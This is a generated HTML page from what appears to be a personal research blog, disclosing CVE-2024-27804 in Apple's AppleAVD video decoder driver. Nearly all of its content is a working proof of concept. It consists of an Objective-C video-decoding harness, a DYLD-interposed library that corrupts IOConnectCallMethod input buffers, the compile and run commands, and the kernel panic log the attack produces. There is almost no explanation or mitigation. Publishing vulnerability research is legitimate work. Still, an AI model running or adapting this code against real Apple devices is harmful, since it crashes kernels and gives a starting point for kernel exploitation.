@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CVE-2024-27804 Vulnerability in AppleAVD | My interesting researches</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="CVE-2024-27804 Vulnerability in AppleAVD" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="https://github.com/R00tkitSMM/CVE-2024-27804" />
+<meta property="og:description" content="https://github.com/R00tkitSMM/CVE-2024-27804" />
+<link rel="canonical" href="http://localhost:4000/fuzzing/2024/05/14/anotherappleavd.html" />
+<meta property="og:url" content="http://localhost:4000/fuzzing/2024/05/14/anotherappleavd.html" />
+<meta property="og:site_name" content="My interesting researches" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-05-14T02:01:01+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CVE-2024-27804 Vulnerability in AppleAVD" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-05-14T02:01:01+02:00","datePublished":"2024-05-14T02:01:01+02:00","description":"https://github.com/R00tkitSMM/CVE-2024-27804","headline":"CVE-2024-27804 Vulnerability in AppleAVD","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/fuzzing/2024/05/14/anotherappleavd.html"},"url":"http://localhost:4000/fuzzing/2024/05/14/anotherappleavd.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="My interesting researches" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">My interesting researches</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">CVE-2024-27804 Vulnerability in AppleAVD</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-05-14T02:01:01+02:00" itemprop="datePublished">May 14, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><a href="https://github.com/R00tkitSMM/CVE-2024-27804">https://github.com/R00tkitSMM/CVE-2024-27804</a></p>
+
+<p>tested on M1</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">// vtdecode.m 
+<span class="c">#include &lt;dlfcn.h&gt;</span>
+<span class="c">#include &lt;stdio.h&gt;</span>
+<span class="c">#import &lt;AVFoundation/AVFoundation.h&gt;</span>
+
+typedef void <span class="o">(</span><span class="k">*</span>t_VTApplyRestrictions<span class="o">)(</span>int arg<span class="o">)</span><span class="p">;</span>
+t_VTApplyRestrictions VTApplyRestrictions<span class="p">;</span>
+
+int __attribute__<span class="o">((</span>noinline<span class="o">))</span> fuzz<span class="o">(</span>const char <span class="k">*</span>filename<span class="o">)</span> <span class="o">{</span>
+  @autoreleasepool <span class="o">{</span>
+    NSError <span class="k">*</span>error <span class="o">=</span> nil<span class="p">;</span>
+    NSURL <span class="k">*</span>fileURL <span class="o">=</span> <span class="o">[</span>NSURL
+        fileURLWithPath:[NSString stringWithCString:filename
+                                           encoding:NSASCIIStringEncoding]]<span class="p">;</span>
+    AVAsset <span class="k">*</span>asset <span class="o">=</span> <span class="o">[</span>AVAsset assetWithURL:fileURL]<span class="p">;</span>
+    <span class="k">if</span> <span class="o">(</span>asset <span class="o">==</span> nil<span class="o">)</span>
+      <span class="k">return </span>0<span class="p">;</span>
+
+    AVAssetReader <span class="k">*</span>reader <span class="o">=</span> <span class="o">[[</span>AVAssetReader alloc] initWithAsset:asset
+                                                           error:&amp;error]<span class="p">;</span>
+    <span class="k">if</span> <span class="o">(</span>reader <span class="o">==</span> nil<span class="o">)</span>
+      <span class="k">return </span>0<span class="p">;</span>
+
+    NSArray <span class="k">*</span>tracks <span class="o">=</span> <span class="o">[</span>asset tracksWithMediaType:AVMediaTypeVideo]<span class="p">;</span>
+    <span class="k">if</span> <span class="o">(</span>tracks <span class="o">==</span> nil <span class="o">||</span> <span class="o">([</span>tracks count] <span class="o">==</span> 0<span class="o">))</span>
+      <span class="k">return </span>0<span class="p">;</span>
+
+    AVAssetTrack <span class="k">*</span>track <span class="o">=</span> tracks[0]<span class="p">;</span>
+
+    NSDictionary <span class="k">*</span>outputSettings <span class="o">=</span> <span class="o">[</span>NSDictionary
+        dictionaryWithObject:[NSNumber numberWithInt:kCMPixelFormat_32BGRA]
+                      forKey:<span class="o">(</span><span class="nb">id</span><span class="o">)</span>kCVPixelBufferPixelFormatTypeKey]<span class="p">;</span>
+    AVAssetReaderTrackOutput <span class="k">*</span>output <span class="o">=</span> <span class="o">[</span>AVAssetReaderTrackOutput
+        assetReaderTrackOutputWithTrack:track
+                         outputSettings:outputSettings]<span class="p">;</span>
+
+    <span class="o">[</span>reader addOutput:output]<span class="p">;</span>
+    <span class="o">[</span>reader startReading]<span class="p">;</span>
+
+    <span class="k">for</span> <span class="o">(</span>int frame <span class="o">=</span> 0<span class="p">;</span> frame &lt; 2<span class="p">;</span> frame++<span class="o">)</span> <span class="o">{</span>
+      // <span class="nb">printf</span><span class="o">(</span><span class="s2">"Frame %d</span><span class="se">\n</span><span class="s2">"</span>, frame<span class="o">)</span><span class="p">;</span>
+
+      CMSampleBufferRef sampleBuffer <span class="o">=</span> <span class="o">[</span>output copyNextSampleBuffer]<span class="p">;</span>
+      <span class="k">if</span> <span class="o">(</span>sampleBuffer <span class="o">==</span> nil<span class="o">)</span>
+        <span class="nb">break</span><span class="p">;</span>
+
+      CMSampleBufferInvalidate<span class="o">(</span>sampleBuffer<span class="o">)</span><span class="p">;</span>
+      CFRelease<span class="o">(</span>sampleBuffer<span class="o">)</span><span class="p">;</span>
+      sampleBuffer <span class="o">=</span> NULL<span class="p">;</span>
+    <span class="o">}</span>
+  <span class="o">}</span>
+
+  <span class="k">return </span>1<span class="p">;</span>
+<span class="o">}</span>
+
+int main<span class="o">(</span>int argc, const char <span class="k">*</span>argv[]<span class="o">)</span> <span class="o">{</span>
+  <span class="k">if</span> <span class="o">(</span>argc &lt; 2<span class="o">)</span> <span class="o">{</span>
+    <span class="nb">printf</span><span class="o">(</span><span class="s2">"Usage: %s &lt;filename&gt;</span><span class="se">\n</span><span class="s2">"</span>, argv[0]<span class="o">)</span><span class="p">;</span>
+    <span class="k">return </span>0<span class="p">;</span>
+  <span class="o">}</span>
+
+  // make decoding run <span class="k">in </span>the current process instead of VTDecoderXPCService
+  void <span class="k">*</span>toolbox <span class="o">=</span> dlopen<span class="o">(</span><span class="s2">"/System/Library/Frameworks/VideoToolbox.framework/"</span>
+                         <span class="s2">"Versions/A/VideoToolbox"</span>,
+                         RTLD_NOW<span class="o">)</span><span class="p">;</span>
+  <span class="k">if</span> <span class="o">(!</span>toolbox<span class="o">)</span> <span class="o">{</span>
+    <span class="nb">printf</span><span class="o">(</span><span class="s2">"Error loading library</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+    <span class="k">return </span>0<span class="p">;</span>
+  <span class="o">}</span>
+  VTApplyRestrictions <span class="o">=</span>
+      <span class="o">(</span>t_VTApplyRestrictions<span class="o">)</span>dlsym<span class="o">(</span>toolbox, <span class="s2">"VTApplyRestrictions"</span><span class="o">)</span><span class="p">;</span>
+  <span class="k">if</span> <span class="o">(!</span>VTApplyRestrictions<span class="o">)</span> <span class="o">{</span>
+    <span class="nb">printf</span><span class="o">(</span><span class="s2">"Error finding VTApplyRestrictions symbol</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+    <span class="k">return </span>0<span class="p">;</span>
+  <span class="o">}</span>
+  VTApplyRestrictions<span class="o">(</span>1<span class="o">)</span><span class="p">;</span>
+
+  fuzz<span class="o">(</span>argv[1]<span class="o">)</span><span class="p">;</span>
+
+  <span class="k">return </span>0<span class="p">;</span>
+<span class="o">}</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="c1">// flip.c</span>
+<span class="cp">#include</span> <span class="cpf">&lt;IOKit/IOKitLib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;dlfcn.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;execinfo.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/sysctl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">flip_bit</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">len</span><span class="p">)</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="n">len</span><span class="p">;</span>
+
+  <span class="p">((</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">)[</span><span class="n">offset</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x41414141</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">kern_return_t</span> <span class="n">fake_IOConnectCallMethod</span><span class="p">(</span><span class="n">mach_port_t</span> <span class="n">connection</span><span class="p">,</span>
+                                       <span class="kt">uint32_t</span> <span class="n">selector</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">input</span><span class="p">,</span>
+                                       <span class="kt">uint32_t</span> <span class="n">inputCnt</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">inputStruct</span><span class="p">,</span>
+                                       <span class="kt">size_t</span> <span class="n">inputStructCnt</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">output</span><span class="p">,</span>
+                                       <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">outputCnt</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">outputStruct</span><span class="p">,</span>
+                                       <span class="kt">size_t</span> <span class="o">*</span><span class="n">outputStructCntP</span><span class="p">)</span> <span class="p">{</span>
+
+  <span class="n">flip_bit</span><span class="p">(</span><span class="n">inputStruct</span><span class="p">,</span> <span class="n">inputStructCnt</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="n">IOConnectCallMethod</span><span class="p">(</span><span class="n">connection</span><span class="p">,</span> <span class="n">selector</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="n">inputCnt</span><span class="p">,</span> <span class="n">inputStruct</span><span class="p">,</span>
+                             <span class="n">inputStructCnt</span><span class="p">,</span> <span class="n">output</span><span class="p">,</span> <span class="n">outputCnt</span><span class="p">,</span> <span class="n">outputStruct</span><span class="p">,</span>
+                             <span class="n">outputStructCntP</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">interposer</span> <span class="p">{</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">replacement</span><span class="p">;</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">original</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">interpose_t</span><span class="p">;</span>
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">used</span><span class="p">))</span> <span class="k">static</span> <span class="k">const</span> <span class="n">interpose_t</span> <span class="n">interposers</span><span class="p">[]</span>
+    <span class="n">__attribute__</span><span class="p">((</span><span class="n">section</span><span class="p">(</span><span class="s">"__DATA,__interpose"</span><span class="p">)))</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">{.</span><span class="n">replacement</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">fake_IOConnectCallMethod</span><span class="p">,</span>
+         <span class="p">.</span><span class="n">original</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">IOConnectCallMethod</span><span class="p">}};</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">clang <span class="nt">-arch</span> arm64 <span class="nt">-o</span> vtdecode vtdecode.m <span class="nt">-framework</span> VideoToolbox <span class="nt">-framework</span> Foundation <span class="nt">-framework</span> CoreMedia  <span class="nt">-framework</span> CoreVideo <span class="nt">-framework</span>  AVFoundation
+clang <span class="nt">-dynamiclib</span> <span class="nt">-o</span> flip.dylib flip.c <span class="nt">-framework</span> IOKit</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nv">DYLD_INSERT_LIBRARIES</span><span class="o">=</span>./flip.dylib ./vtdecode input_poc/orientation-normal-fragmented.mp4.mov</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">panic<span class="o">(</span>cpu 4 <span class="nb">caller </span>0xfffffe0026851cdc<span class="o">)</span>: Unaligned kernel data abort. at pc 0xfffffe0026aed514, lr 0xfffffe0026aed5d8 <span class="o">(</span>saved state: 0xfffffe3a396e3200<span class="o">)</span>
+	  x0:  0x000000000000000e x1:  0xfffffe1002bdc01b  x2:  0x0000000000000000  x3:  0xfffffe3a396e3444
+	  x4:  0xfffffe3a396e344c x5:  0x000000000002d1f4  x6:  0x0000000000000000  x7:  0xffffffffffffffff
+	  x8:  0x0000000000000004 x9:  0xfffffe1002bdc01f  x10: 0x0000000000000000  x11: 0x0000000000000002
+	  x12: 0x0000000000000004 x13: 0x0000000000000000  x14: 0x0000000000000000  x15: 0x0000000000000000
+	  x16: 0xfffffe0026aeda90 x17: 0xfffffe0026aed9fc  x18: 0x0000000000000000  x19: 0xfffffe1b40e90000
+	  x20: 0x0000000000000000 x21: 0x0000000000000000  x22: 0xfffffe1002bdc000  x23: 0x0000000000000001
+	  x24: 0x0000000000000000 x25: 0xfffffe1002bdc024  x26: 0x000000000000001b  x27: 0x00000000000008b0
+	  x28: 0x000000000000001b fp:  0xfffffe3a396e3610  lr:  0xfffffe0026aed5d8  sp:  0xfffffe3a396e3550
+	  pc:  0xfffffe0026aed514 cpsr: 0x60401208         esr: 0x96000021          far: 0xfffffe1002bdc01b
+
+Debugger message: panic
+Memory ID: 0x6
+OS release <span class="nb">type</span>: User
+OS version: 23C71
+Kernel version: Darwin Kernel Version 23.2.0: Wed Nov 15 21:53:34 PST 2023<span class="p">;</span> root:xnu-10002.61.3~2/RELEASE_ARM64_T8103
+Fileset Kernelcache UUID: 6DAC2CF8E68E8F436296A697E29AAD44
+Kernel UUID: E245D804-1FA3-31E2-90BC-B4DF75B2129E
+Boot session UUID: 52885412-0864-4DFF-8E9E-36C3C7BC8B88
+iBoot version: iBoot-10151.61.4
+secure boot?: YES
+roots installed: 0
+Paniclog version: 14
+KernelCache slide: 0x000000001dac4000
+KernelCache base:  0xfffffe0024ac8000
+Kernel slide:      0x000000001dacc000
+Kernel text base:  0xfffffe0024ad0000
+Kernel text <span class="nb">exec </span>slide: 0x000000001efd8000
+Kernel text <span class="nb">exec </span>base:  0xfffffe0025fdc000
+mach_absolute_time: 0x1c4f4c5a5
+Epoch Time:        sec       usec
+  Boot    : 0x65a56518 0x000b7c0f
+  Sleep   : 0x00000000 0x00000000
+  Wake    : 0x00000000 0x00000000
+  Calendar: 0x65a5664f 0x00072ae4
+
+Zone info:
+  Zone map: 0xfffffe100f2dc000 - 0xfffffe300f2dc000
+  <span class="nb">.</span> VM    : 0xfffffe100f2dc000 - 0xfffffe14dbfa8000
+  <span class="nb">.</span> RO    : 0xfffffe14dbfa8000 - 0xfffffe1675940000
+  <span class="nb">.</span> GEN0  : 0xfffffe1675940000 - 0xfffffe1b4260c000
+  <span class="nb">.</span> GEN1  : 0xfffffe1b4260c000 - 0xfffffe200f2d8000
+  <span class="nb">.</span> GEN2  : 0xfffffe200f2d8000 - 0xfffffe24dbfa4000
+  <span class="nb">.</span> GEN3  : 0xfffffe24dbfa4000 - 0xfffffe29a8c70000
+  <span class="nb">.</span> DATA  : 0xfffffe29a8c70000 - 0xfffffe300f2dc000
+  Metadata: 0xfffffe3a1c3ac000 - 0xfffffe3a243ac000
+  Bitmaps : 0xfffffe3a243ac000 - 0xfffffe3a27194000
+  Extra   : 0 - 0
+
+CORE 0 recently retired instr at 0xfffffe00261886e4
+CORE 1 recently retired instr at 0xfffffe00261886e4
+CORE 2 recently retired instr at 0xfffffe00261886e4
+CORE 3 recently retired instr at 0xfffffe00261886e4
+CORE 4 recently retired instr at 0xfffffe0026186ee8
+CORE 5 recently retired instr at 0xfffffe00261886e4
+CORE 6 recently retired instr at 0xfffffe00261886e4
+CORE 7 recently retired instr at 0xfffffe00261886e4
+TPIDRx_ELy <span class="o">=</span> <span class="o">{</span>1: 0xfffffe1b448bd030  0: 0x0000000000001004  0ro: 0x000000010061c320 <span class="o">}</span>
+CORE 0 PVH locks held: None
+CORE 1 PVH locks held: None
+CORE 2 PVH locks held: None
+CORE 3 PVH locks held: None
+CORE 4 PVH locks held: None
+CORE 5 PVH locks held: None
+CORE 6 PVH locks held: None
+CORE 7 PVH locks held: None
+CORE 0: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a39a13ef0
+CORE 1: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a392b7ef0
+CORE 2: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a37df7ef0
+CORE 3: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a37c8fef0
+CORE 4 is the one that panicked. Check the full backtrace <span class="k">for </span>details.
+CORE 5: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff34, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a39033ef0
+CORE 6: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff34, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a39893ef0
+CORE 7: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff34, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a396a7ef0
+Compressor Info: 3% of compressed pages limit <span class="o">(</span>OK<span class="o">)</span> and 2% of segments limit <span class="o">(</span>OK<span class="o">)</span> with 0 swapfiles and OK swap space
+Panicked task 0xfffffe1b46695e18: 14298 pages, 13 threads: pid 2352: vtdecode
+Panicked thread: 0xfffffe1b448bd030, backtrace: 0xfffffe3a396e2930, tid: 184820
+		  lr: 0xfffffe0026035568  fp: 0xfffffe3a396e29c0
+		  lr: 0xfffffe002617fa24  fp: 0xfffffe3a396e2a30
+		  lr: 0xfffffe002617de84  fp: 0xfffffe3a396e2b20
+		  lr: 0xfffffe0025fe3b68  fp: 0xfffffe3a396e2b30
+		  lr: 0xfffffe0026034e48  fp: 0xfffffe3a396e2ee0
+		  lr: 0xfffffe002684726c  fp: 0xfffffe3a396e2f00
+		  lr: 0xfffffe0026851cdc  fp: 0xfffffe3a396e3080
+		  lr: 0xfffffe002617f890  fp: 0xfffffe3a396e30f0
+		  lr: 0xfffffe002617e138  fp: 0xfffffe3a396e31e0
+		  lr: 0xfffffe0025fe3b68  fp: 0xfffffe3a396e31f0
+		  lr: 0xfffffe0026aed5d8  fp: 0xfffffe3a396e3610
+		  lr: 0xfffffe0026ad6fe4  fp: 0xfffffe3a396e3720
+		  lr: 0xfffffe0026ad66b4  fp: 0xfffffe3a396e3790
+		  lr: 0xfffffe0026ad4e48  fp: 0xfffffe3a396e37d0
+		  lr: 0xfffffe00267a0168  fp: 0xfffffe3a396e3810
+		  lr: 0xfffffe00267a0484  fp: 0xfffffe3a396e39a0
+		  lr: 0xfffffe002614b294  fp: 0xfffffe3a396e3ac0
+		  lr: 0xfffffe002603bce8  fp: 0xfffffe3a396e3b60
+		  lr: 0xfffffe002600edd4  fp: 0xfffffe3a396e3bc0
+		  lr: 0xfffffe00260273f8  fp: 0xfffffe3a396e3c60
+		  lr: 0xfffffe0026027864  fp: 0xfffffe3a396e3d50
+		  lr: 0xfffffe0026173698  fp: 0xfffffe3a396e3e20
+		  lr: 0xfffffe002617e18c  fp: 0xfffffe3a396e3f10
+		  lr: 0xfffffe0025fe3b68  fp: 0xfffffe3a396e3f20
+      Kernel Extensions <span class="k">in </span>backtrace:
+         com.apple.driver.AppleAVD<span class="o">(</span>737.1<span class="o">)[</span>63D957B3-2E48-36EA-880C-6F0BE3DE16A6]@0xfffffe0026a37e00-&gt;0xfffffe0026b04b43
+            dependency: com.apple.driver.AppleARMPlatform<span class="o">(</span>1.0.2<span class="o">)[</span>9FC0A536-5BC6-33D5-911A-5A46BDDBBCEF]@0xfffffe00269dfe20-&gt;0xfffffe0026a3295b
+            dependency: com.apple.driver.FairPlayIOKit<span class="o">(</span>71.3.0<span class="o">)[</span>AD212727-D14F-3DA2-8974-6CEA43B45BC1]@0xfffffe0027e23b50-&gt;0xfffffe0027f19aef
+            dependency: com.apple.iokit.CoreAnalyticsFamily<span class="o">(</span>1<span class="o">)[</span>0896C7D3-89F2-3D56-A301-5CB0FE0BBEAC]@0xfffffe0027cb1f60-&gt;0xfffffe0027cb9d4b
+            dependency: com.apple.iokit.IOSurface<span class="o">(</span>352.0.3<span class="o">)[</span>0351AFC2-D85C-3BB5-B9C6-C8C0F6C7A01D]@0xfffffe00288a7dc0-&gt;0xfffffe00288d85ab</code></pre></figure>
+
+
+  </div><a class="u-url" href="/fuzzing/2024/05/14/anotherappleavd.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">My interesting researches</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">My interesting researches</li><li><a class="u-email" href="mailto:firozimaysam at gmail.com">firozimaysam at gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/R00tkitSMM"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">R00tkitSMM</span></a></li><li><a href="https://www.twitter.com/R00tkitSMM"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">R00tkitSMM</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>I share what I find interesting here..</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
